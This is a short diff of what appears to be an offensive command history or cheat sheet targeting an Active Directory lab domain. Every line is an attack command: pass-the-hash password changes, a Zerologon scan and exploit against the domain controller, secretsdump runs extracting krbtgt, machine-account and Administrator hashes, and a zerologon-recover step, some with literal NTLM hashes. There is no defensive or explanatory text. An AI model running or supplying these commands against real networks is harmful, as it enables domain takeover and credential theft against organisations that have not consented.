@@ -167,5 +167,5 @@ net rpc password someuser -U BREAKING/anotheruser -S DC01.BREAKING.BAD
 pth-net rpc password someuser -U BREAKING/anotheruser%ffffffffffffffffffffffffffffffff:c1c635aa12ae60b7fe39e28456a7bac6 -S DC01.BREAKING.BAD
 zerologon-scan DC01 192.168.56.101
 zerologon-exploit DC01 192.168.56.101
-secretsdump -just-dc-user krbtgt -no-pass 'BREAKING.BAD/DC01$@dc01.breaking.bad'
-secretsdump -history -just-dc-user 'DC01$' -no-pass 'BREAKING.BAD/DC01$@dc01.breaking.bad'
+secretsdump -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
+zerologon-recover breaking/dc01@dc01 -target-ip 192.168.56.101 -hexpass 69762...6945d
